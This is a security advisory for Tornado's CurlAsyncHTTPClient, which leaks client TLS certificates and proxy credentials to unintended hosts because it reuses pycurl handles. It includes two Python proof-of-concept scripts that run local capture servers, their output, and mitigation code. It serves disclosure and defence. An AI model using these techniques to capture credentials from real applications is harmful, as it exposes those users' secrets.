# [M] Tornado: CurlAsyncHTTPClient leaks per-request credentials on handle reuse

## Summary
Severity: Medium
Advisory: GHSA-pw6j-qg29-8w7f
CWE: CWE-200, CWE-672
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-pw6j-qg29-8w7f
Type: github-advisory

## Affected
- PyPI: `tornado` — affected >=0 <6.5.7

## Details
# CurlAsyncHTTPClient leaks per-request credentials on handle reuse

## Summary

`CurlAsyncHTTPClient` pools and reuses `pycurl` handles across requests but does
not reset them between requests, and several per-request options are applied with
no clearing branch. As a result, sensitive state set by one request persists onto
a later request on the same client that does not set it. Two credential vectors
are demonstrated below — a client TLS certificate (`SSLCERT`/`SSLKEY`) and proxy
basic-auth credentials (`PROXYUSERPWD`) — both leaking to a different,
unintended host. This affects all released versions through 6.5.6.

## Details

In `tornado/curl_httpclient.py`, handles are created once and returned to a free
list for reuse (`_process_queue` pops the handle at line 200, `_finish`
re-appends it at line 245), and `_curl_setup_request` is never preceded by
`curl.reset()`. The function clears *some* carried-over state on the reused handle
— `unsetopt(PROXYUSERPWD)` in the no-proxy branch (line 394), `unsetopt(USERPWD)`
when no auth is set (line 495), and the HTTP-method flag reset (lines 428-432) —
but other options have no equivalent clearing path and persist until a later
request sets them again.

**Vector A — client TLS certificate (`SSLCERT`/`SSLKEY`).** Set-only, no clearing
branch:

```python
# tornado/curl_httpclient.py (v6.5.6), lines 498-502
if request.client_cert is not None:
    curl.setopt(pycurl.SSLCERT, request.client_cert)

if request.client_key is not None:
    curl.setopt(pycurl.SSLKEY, request.client_key)
```

A request that sets `client_cert` leaves the certificate on the handle; a later
request without `client_cert` presents it during its TLS handshake.

**Vector B — proxy credentials (`PROXYUSERPWD`).** `PROXYUSERPWD` is set only
inside the credentials branch and unset only in the no-proxy `else` branch:

```python
# tornado/curl_httpclient.py (v6.5.6), lines 371-394
if request.proxy_host and request.proxy_port:
    curl.setopt(pycurl.PROXY, request.proxy_host)
    curl.setopt(pycurl.PROXYPORT, request.proxy_port)
    if request.proxy_username:                 # only place PROXYUSERPWD is set
        ...
        curl.setopt(pycurl.PROXYUSERPWD, credentials)
    ...
else:
    try:
        curl.unsetopt(pycurl.PROXY)
    except TypeError:
        curl.setopt(pycurl.PROXY, "")
    curl.unsetopt(pycurl.PROXYUSERPWD)         # only place it is unset
```

A request that sets a *new* `proxy_host` without `proxy_username` updates
`PROXY`/`PROXYPORT` but never reaches the `else`, so the previous request's
credentials persist and are sent to the new proxy.

The same class also affects `INTERFACE` (lines 365-366: set only when
`request.network_interface` is truthy, with no clearing branch), which is a
lower-severity instance — a later request can be bound to a network interface it
did not request. A single fix addresses all three (see Mitigation).

## PoC

Both reproduce against the pinned release using public API only
(`CurlAsyncHTTPClient`, `HTTPRequest`, and the documented per-request arguments).

### Vector A — client TLS certificate

The two servers listen on different ports, so request B opens a fresh TCP+TLS
connection; the certificate can only reach server 2 via the persisted handle
option, not connection or session reuse.

```
python3 -m venv venv
./venv/bin/pip install "tornado==6.5.6" pycurl cryptography
./venv/bin/python poc_client_cert.py
```

```python
import asyncio
import datetime
import ipaddress
import os
import socket
import ssl
import sys
import tempfile
import threading

from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from tornado.httpclient import HTTPRequest
from tornado.curl_httpclient import CurlAsyncHTTPClient


def _key():
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def _ca():
    key = _key()
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "PoC-CA")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    return cert, key


def _leaf(cn, ca_cert, ca_key, ips=None, client=False):
    key = _key()
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    now = datetime.datetime.now(datetime.timezone.utc)
    b = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(ca_cert.subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
    )
    if ips:
        b = b.add_extension(
            x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address(i)) for i in ips]),
            critical=False,
        )
    if client:
        b = b.add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]), critical=False
        )
    return b.sign(ca_key, hashes.SHA256()), key


def _pem(path, cert, key=None):
    with open(path, "wb") as fh:
        fh.write(cert.public_bytes(serialization.Encoding.PEM))
        if key is not None:
            fh.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))


class TLSServer:
    def __init__(self, srv_pem, ca_pem, require):
        self.captures = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(4)
        self.port = self.sock.getsockname()[1]
        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ctx.load_cert_chain(srv_pem)
        self.ctx.load_verify_locations(ca_pem)
        self.ctx.verify_mode = ssl.CERT_REQUIRED if require else ssl.CERT_OPTIONAL
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            try:
                s = self.ctx.wrap_socket(conn, server_side=True)
                self.captures.append(s.getpeercert() or None)
                try:
                    s.recv(4096)
                    s.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
                except Exception:
                    pass
                s.close()
            except Exception:
                self.captures.append("handshake-failed")
                conn.close()

    def stop(self):
        try:
            self.sock.close()
        except Exception:
            pass


def _cn(peer):
    if not peer or not isinstance(peer, dict):
        return None
    for rdn in peer.get("subject", ()):
        for k, v in rdn:
            if k == "commonName":
                return v
    return None


async def main():
    with tempfile.TemporaryDirectory() as tmp:
        ca_cert, ca_key = _ca()
        s1_cert, s1_key = _leaf("server1.local", ca_cert, ca_key, ips=["127.0.0.1"])
        s2_cert, s2_key = _leaf("server2.local", ca_cert, ca_key, ips=["127.0.0.1"])
        cli_cert, cli_key = _leaf("trusted-client", ca_cert, ca_key, client=True)

        ca_pem = os.path.join(tmp, "ca.pem")
        s1_pem = os.path.join(tmp, "s1.pem")
        s2_pem = os.path.join(tmp, "s2.pem")
        cert_pem = os.path.join(tmp, "client.crt")
        key_pem = os.path.join(tmp, "client.key")
        _pem(ca_pem, ca_cert)
        _pem(s1_pem, s1_cert, s1_key)
        _pem(s2_pem, s2_cert, s2_key)
        _pem(cert_pem, cli_cert)
        with open(key_pem, "wb") as fh:
            fh.write(cli_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))

        s1 = TLSServer(s1_pem, ca_pem, require=True)
        s2 = TLSServer(s2_pem, ca_pem, require=False)
        try:
            clean = CurlAsyncHTTPClient(max_clients=1, force_instance=True)
            await clean.fetch(HTTPRequest(
                f"https://127.0.0.1:{s2.port}/baseline",
                ca_certs=ca_pem, request_timeout=5), raise_error=False)
            clean.close()

            client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)
            await client.fetch(HTTPRequest(
                f"https://127.0.0.1:{s1.port}/internal-mtls",
                client_cert=cert_pem, client_key=key_pem,
                ca_certs=ca_pem, request_timeout=5), raise_error=False)
            await client.fetch(HTTPRequest(
                f"https://127.0.0.1:{s2.port}/other-host",
                ca_certs=ca_pem, request_timeout=5), raise_error=False)
            await asyncio.sleep(0.2)
            client.close()
        finally:
            s1.stop()
            s2.stop()

        baseline = _cn(s2.captures[0]) if s2.captures else None
        leaked = _cn(s2.captures[1]) if len(s2.captures) > 1 else None

        print(f"{'scenario':<48}{'cert presented to server 2'}")
        print(f"{'-' * 48}{'-' * 28}")
        print(f"{'baseline: clean client, no client_cert':<48}{baseline!r}")
        print(f"{'exploit: reused handle (A had client_cert)':<48}{leaked!r}")
        print()
        print(f"(sanity) server 1 (mTLS required) saw: {_cn(s1.captures[0]) if s1.captures else None!r}")
        print()
        if baseline is None and leaked == "trusted-client":
            print("VERDICT: VULNERABLE — the client certificate from request A was "
                  "presented to server 2 on request B, which specified none.")
            return 0
        print(f"VERDICT: not reproduced (baseline={baseline!r} leaked={leaked!r})")
        return 2


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
```

Output (`pip show tornado` → 6.5.6, installed in the venv):

```
scenario                                        cert presented to server 2
----------------------------------------------------------------------------
baseline: clean client, no client_cert          None
exploit: reused handle (A had client_cert)      'trusted-client'

(sanity) server 1 (mTLS required) saw: 'trusted-client'

VERDICT: VULNERABLE — the client certificate from request A was presented to
server 2 on request B, which specified none.
```

### Vector B — proxy credentials

Each proxy is a separate listener capturing the raw request bytes.

```
./venv/bin/python poc_proxy_creds.py
```

```python
import asyncio
import base64
import socket
import sys
import threading

from tornado.httpclient import HTTPRequest
from tornado.curl_httpclient import CurlAsyncHTTPClient


class CapturingProxy:
    def __init__(self):
        self.captures = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(4)
        self.port = self.sock.getsockname()[1]
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            try:
                data = b""
                while b"\r\n\r\n" not in data and len(data) < 8192:
                    chunk = conn.recv(2048)
                    if not chunk:
                        break
                    data += chunk
                self.captures.append(data)
                conn.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n"
                             b"Connection: close\r\n\r\n")
            except Exception:
                pass
            finally:
                conn.close()

    def stop(self):
        try:
            self.sock.close()
        except Exception:
            pass


def proxy_authz(raw):
    head = raw.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    for line in head.split("\r\n"):
        if line.lower().startswith("proxy-authorization:"):
            return line
    return None


async def main():
    proxy_a = CapturingProxy()
    proxy_b = CapturingProxy()
    try:
        client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)
        await client.fetch(HTTPRequest(
            "http://target.example/a",
            proxy_host="127.0.0.1", proxy_port=proxy_a.port,
            proxy_username="alice", proxy_password="secretA",
            request_timeout=5, connect_timeout=5), raise_error=False)
        await client.fetch(HTTPRequest(
            "http://target.example/b",
            proxy_host="127.0.0.1", proxy_port=proxy_b.port,
            request_timeout=5, connect_timeout=5), raise_error=False)
        await asyncio.sleep(0.2)
        client.close()
    finally:
        proxy_a.stop()
        proxy_b.stop()

    a = proxy_authz(proxy_a.captures[0]) if proxy_a.captures else None
    b = proxy_authz(proxy_b.captures[0]) if proxy_b.captures else None
    expected = "Basic " + base64.b64encode(b"alice:secretA").decode()

    print(f"{'request':<42}{'Proxy-Authorization seen by that proxy'}")
    print(f"{'-' * 42}{'-' * 40}")
    print(f"{'A -> proxy A (alice:secretA specified)':<42}{a or '(none)'}")
    print(f"{'B -> proxy B (NO credentials specified)':<42}{b or '(none)'}")
    print()
    if b and expected in b:
        print(f"VERDICT: VULNERABLE — proxy B received alice's credentials "
              f"({expected}) although request B specified no proxy_username.")
        return 0
    print(f"VERDICT: not reproduced (proxy B saw: {b!r})")
    return 2


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
```

Output (`YWxpY2U6c2VjcmV0QQ==` decodes to `alice:secretA`):

```
request                                   Proxy-Authorization seen by that proxy
----------------------------------------------------------------------------------
A -> proxy A (alice:secretA specified)    Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==
B -> proxy B (NO credentials specified)   Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==

VERDICT: VULNERABLE — proxy B received alice's credentials (Basic
YWxpY2U6c2VjcmV0QQ==) although request B specified no proxy_username.
```

## Impact

* **Type:** Exposure of credentials to an unintended party (CWE-200), via reuse
  of a resource whose sensitive state was not cleared (CWE-672).
* **Actors:** An application that issues requests with differing per-request
  options on a shared `CurlAsyncHTTPClient` — for Vector A, mixing per-request
  `client_cert` requests with non-certificate requests; for Vector B,
  multiplexing requests across more than one proxy with per-proxy credentials.
* **Effect:** For Vector A, the client completes the TLS client-authentication
  handshake — proving possession of the private key and disclosing the
  certificate subject and chain — to a host that was never meant to receive it.
  For Vector B, proxy basic-auth credentials are transmitted (base64) to a
  different proxy. If the unintended host/proxy is attacker-controlled or
  attacker-influenced (a user-supplied URL, webhook target, SSRF-reachable
  endpoint, or a proxy chosen from user-controlled configuration), the credential
  is disclosed to the attacker.
* **Scope:** Only applications using the optional `CurlAsyncHTTPClient` backend
  with the patterns above are affected. The default `SimpleAsyncHTTPClient` is not
  affected (and does not support proxies).

Proposed CWE: CWE-200 / CWE-672. Proposed CVSS 3.1:
`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` (5.9, medium); attack complexity is
High because exploitation depends on the application using differing per-request
options on a shared client and on handle scheduling.

## Mitigation

A single fix closes all instances of this class: call `curl.reset()` at the start
of `_curl_setup_request` and then re-apply the per-request options, so no state
from a prior request can persist on the reused handle. (Note `curl.reset()` also
clears `CAINFO`, which the current code intentionally leaves untouched — see the
comment at lines 401-409 — so that default would need to be re-established after
the reset.)

Alternatively, add explicit clearing branches mirroring the existing
`PROXYUSERPWD`/`USERPWD` handling:

```python
# client certificate
if request.client_cert is not None:
    curl.setopt(pycurl.SSLCERT, request.client_cert)
else:
    curl.unsetopt(pycurl.SSLCERT)
if request.client_key is not None:
    curl.setopt(pycurl.SSLKEY, request.client_key)
else:
    curl.unsetopt(pycurl.SSLKEY)

# proxy credentials (inside the `if request.proxy_host and request.proxy_port:` branch)
if request.proxy_username:
    ...
    curl.setopt(pycurl.PROXYUSERPWD, credentials)
else:
    curl.unsetopt(pycurl.PROXYUSERPWD)

# network interface
if request.network_interface:
    curl.setopt(pycurl.INTERFACE, request.network_interface)
else:
    curl.unsetopt(pycurl.INTERFACE)
```

Until a fix is available, use a separate `CurlAsyncHTTPClient` instance per
distinct credential set (per client certificate / per proxy credential), or use
`SimpleAsyncHTTPClient` where applicable.

## References
- https://github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f
- https://github.com/tornadoweb/tornado
